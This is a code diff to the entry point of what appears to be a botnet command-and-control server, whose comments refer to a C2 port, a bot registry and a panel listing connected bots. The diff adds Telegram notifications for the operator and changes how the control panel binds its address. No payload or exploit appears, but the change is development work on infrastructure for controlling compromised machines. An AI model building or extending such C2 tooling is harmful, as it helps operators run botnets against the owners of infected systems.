@@ -34,6 +34,21 @@ def main():
     server.registry = _panel_server.registry
     _panel_server.c2 = server
 
+    # Telegram notifications, when the operator configured them.
+    try:
+        from .telegram import Telegram
+        tg = Telegram.from_config(cfg)
+        server.telegram = tg
+        _panel_server.registry.telegram = tg
+        if tg.configured() and tg.enabled:
+            ok, msg = tg.test()
+            if ok:
+                log("Telegram notifications are on")
+            else:
+                log("Telegram test failed: %s", msg)
+    except Exception as e:
+        log("Telegram setup skipped: %s", e)
+
     # The control channel lives on the C2 port + 1, on loopback only.
     control = ControlServer(server, "127.0.0.1", int(c2.get("port", 8777)) + 1)
     control.start()
@@ -51,7 +66,10 @@ def main():
     # that copy would get its own bot registry, so the panel would show an
     # empty list while the C2 had bots connected.
     from .panel import app
-    uvicorn.run(app, host=web.get("host", "127.0.0.1"),
+    bind_host = cfgmod.bind_address(web)
+    if bind_host != web.get("host"):
+        print(f"  (bound to {bind_host}; http://127.0.0.1:{web.get('port')}/ works too)")
+    uvicorn.run(app, host=bind_host,
                 port=int(web.get("port", 8080)), log_level="info")
     return 0
 
